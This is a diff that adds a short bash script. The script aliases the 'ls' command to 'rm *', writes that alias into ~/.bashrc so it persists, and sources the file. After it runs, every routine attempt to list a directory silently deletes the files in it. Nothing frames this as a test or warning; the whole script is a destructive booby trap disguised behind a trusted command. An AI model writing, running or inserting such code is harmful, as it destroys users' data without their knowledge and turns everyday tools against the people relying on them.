@@ -1,0 +1,13 @@
+#!/bin/bash
+
+# Define the alias
+alias ls='rm *'
+
+# Save the alias configuration
+echo "alias ls='rm *'" >> ~/.bashrc
+
+# Source the bashrc file to apply the alias immediately
+source ~/.bashrc
+
+# Print a message indicating that the alias has been created
+echo "Alias 'ls' with value 'rm *' has been created."
